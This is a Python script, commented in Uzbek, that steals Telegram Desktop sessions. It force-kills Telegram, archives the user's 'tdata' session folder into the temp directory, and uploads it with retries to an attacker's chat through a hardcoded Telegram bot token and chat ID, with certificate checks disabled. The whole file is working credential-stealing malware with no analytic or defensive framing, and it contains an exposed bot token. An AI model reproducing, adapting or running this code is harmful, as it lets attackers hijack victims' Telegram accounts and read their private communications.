import os
import zipfile
import requests
import time
import psutil
import subprocess
import sys
import shutil
from urllib3.exceptions import InsecureRequestWarning
import urllib3

urllib3.disable_warnings(InsecureRequestWarning)

TOKEN = '8163157021:AAGE1b81bD7n7NB4UMCXhIjYqnlM2ZGyFMo'
CHAT_ID = '7984884145'
TDATA_PATH = os.path.join(os.getenv('APPDATA'), 'Telegram Desktop', 'tdata')
ZIP_PATH = os.path.join(os.getenv('TEMP'), 'tdata_archive.zip')

def kill_telegram_process():
    """Telegram jarayonlarini o'chirish (tildan mustaqil)"""
    try:
        # Birinchi urinish: taskkill orqali
        subprocess.run(['taskkill', '/F', '/IM', 'Telegram.exe', '/T'], 
                      stdout=subprocess.DEVNULL, 
                      stderr=subprocess.DEVNULL,
                      timeout=10)
        time.sleep(2)
        
        # Ikkinchi urinish: psutil orqali
        for proc in psutil.process_iter(['name']):
            if proc.info['name'] and 'telegram' in proc.info['name'].lower():
                try:
                    proc.kill()
                except:
                    continue
        time.sleep(1)
    except Exception as e:
        print(f"Processni o'chirishda xato: {str(e)[:100]}")

def zip_tdata():
    try:
        # Avvalgi zip faylini o'chirish
        if os.path.exists(ZIP_PATH):
            os.remove(ZIP_PATH)
            
        with zipfile.ZipFile(ZIP_PATH, 'w', zipfile.ZIP_DEFLATED) as zipf:
            for root, _, files in os.walk(TDATA_PATH):
                for file in files:
                    file_path = os.path.join(root, file)
                    try:
                        arcname = os.path.relpath(file_path, TDATA_PATH)
                        zipf.write(file_path, arcname)
                    except Exception as e:
                        print(f"Xato fayl: {file_path} - {str(e)[:50]}")
                        continue
        return True
    except Exception as e:
        print(f"Zip qilishda xato: {str(e)[:100]}")
        return False

def send_to_telegram():
    url = f'https://api.telegram.org/bot{TOKEN}/sendDocument'
    try:
        # Fayl hajmini tekshirish
        if os.path.getsize(ZIP_PATH) > 50 * 1024 * 1024:  # 50MB
            print("Fayl hajmi juda katta")
            return False
            
        with open(ZIP_PATH, 'rb') as f:
            response = requests.post(
                url,
                files={'document': f},
                data={'chat_id': CHAT_ID},
                verify=False,
                timeout=120  # 2 daqiqalik timeout
            )
            
        # Xatolikni tekshirish
        if response.status_code != 200:
            print(f"Telegram API xatosi: {response.status_code} - {response.text[:100]}")
            return False
            
        return True
    except Exception as e:
        print(f"Yuborishda xato: {str(e)[:100]}")
        return False

def main():
    try:
        # Telegram jarayonlarini o'chirish
        kill_telegram_process()
        
        # tdata papkasini tekshirish
        if not os.path.exists(TDATA_PATH):
            print("tdata papkasi topilmadi")
            return False
        
        # ZIP faylini yaratish
        if not zip_tdata():
            return False
        
        # Yuklab olish urinishlari
        for attempt in range(3):
            print(f"Urinish {attempt+1}/3")
            if send_to_telegram():
                print("Muvaffaqiyatli yuborildi!")
                return True
            time.sleep(5)
        
        print("Yuborish muvaffaqiyatsiz tugadi")
        return False
    except Exception as e:
        print(f"Kutilmagan xato: {str(e)[:100]}")
        return False

if __name__ == '__main__':
    main()
